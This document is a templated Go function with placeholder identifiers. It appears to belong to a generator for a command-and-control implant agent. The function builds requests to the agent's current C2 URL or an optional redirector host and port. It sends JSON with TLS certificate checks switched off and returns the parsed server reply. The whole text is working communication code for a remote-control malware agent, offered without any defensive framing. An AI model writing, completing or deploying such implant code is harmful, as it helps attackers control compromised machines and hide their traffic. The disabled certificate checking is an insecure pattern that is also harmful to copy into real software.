func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data interface{}) (*{API_RESPONSE_STRUCT_NAME}, error) {
	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)

	var url string
	if a.{AGENT_USE_REDIRECTOR_FIELD} {
		protocol := "http"
		if strings.HasPrefix(a.{AGENT_CURRENT_C2_URL_FIELD}, "https") {
			protocol = "https"
		}
		url = fmt.Sprintf("%s://%s:%d%s", protocol, a.{AGENT_REDIRECTOR_HOST_FIELD}, a.{AGENT_REDIRECTOR_PORT_FIELD}, uri)
	} else {
		url = a.{AGENT_CURRENT_C2_URL_FIELD} + uri
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: false,  // Keep connections alive for efficiency
		MaxIdleConns: 10,
		IdleConnTimeout: 90 * time.Second,
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	var req *http.Request
	var err error

	if data != nil {
		jsonData, err := json.Marshal(data)
		if err != nil {
			return nil, err
		}
		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, err = http.NewRequest(method, url, nil)
		if err != nil {
			return nil, err
		}
	}

	for key, value := range a.{AGENT_HEADERS_FIELD} {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()


	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}


	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	var apiResp {API_RESPONSE_STRUCT_NAME}
	err = json.Unmarshal(body, &apiResp)
	if err != nil {
		return nil, err
	}

	return &apiResp, nil
}